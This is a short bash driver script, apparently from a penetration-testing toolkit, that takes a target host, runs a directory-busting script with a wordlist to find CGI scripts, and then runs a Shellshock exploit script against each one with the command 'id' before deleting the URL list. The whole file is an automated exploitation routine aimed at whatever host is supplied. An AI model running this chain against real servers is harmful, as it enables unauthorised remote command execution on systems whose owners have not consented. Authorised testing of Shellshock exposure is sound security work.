#!/bin/bash

export http_proxy="";

if [ -z $1 ]
then echo "Usage: ./runme.sh http://[Host/IP]"; exit 1;

else
	./dirbust.sh $1 wordlist.txt 
	
	if [ -f urllist.txt ]
		then for I in `cat urllist.txt`; do ./shellshock.sh $I id; done

		rm urllist.txt

	else echo "No valid CGI scripts found";
	fi

fi
